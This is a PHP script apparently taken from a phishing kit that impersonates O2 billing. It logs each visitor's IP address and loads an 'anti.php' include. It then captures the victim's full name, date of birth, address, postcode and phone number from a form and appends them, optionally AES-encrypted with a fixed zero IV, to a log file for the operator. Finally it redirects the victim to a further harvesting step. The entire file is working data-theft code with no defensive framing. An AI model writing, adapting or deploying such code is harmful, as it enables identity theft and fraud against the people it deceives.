<?php
error_reporting(0);
session_start();
include "Config.php";
include 'anti.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$click .= "$ip\n";
$clickfile=fopen("logs/O2-billing.txt","a");
fwrite($clickfile,$click);
fclose($clickfile);
if(isset($_POST['given_name']))  {
$message2 .= $_SESSION['msg'];
$message2 .= "--------------O2 Billing-----------------------\n";
$message2 .= "Full Name : ".$_POST['given_name']." ".$_POST['family_name']."\n";
$message2 .= "Date Of Birth : ".$_POST['birthdate']."\n";
$message2 .= "Address 1 : ".$_POST['address']."\n";
$message2 .= "Address 2 : ".$_POST['address2']."\n";
$message2 .= "City : ".$_POST['City']."\n";
$message2 .= "County : ".$_POST['County']."\n";
$message2 .= "Post Code : ".$_POST['postc']."\n";
$message2 .= "Phone Number : ".$_POST['number']."\n";
$_SESSION['msg2'] = $message2;
if($Encrypt==1) {
    $method = 'aes-256-cbc';
    $key = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $encrypted = base64_encode(openssl_encrypt($message2, $method, $key, OPENSSL_RAW_DATA, $iv));
    }
    if($Save_Log==1) {
        if($Encrypt==1) {
        $file=fopen("../logs/O2-billing.txt","a");
        fwrite($file,$encrypted);
        fclose($file);
        }
        else {
        $file=fopen("../logs/O2-billing.txt","a");
        fwrite($file,$message2);
        fclose($file);
        }
    }
    
     $praga=rand();
     $praga=md5($praga);
    
     header("location: step2");
    }

?>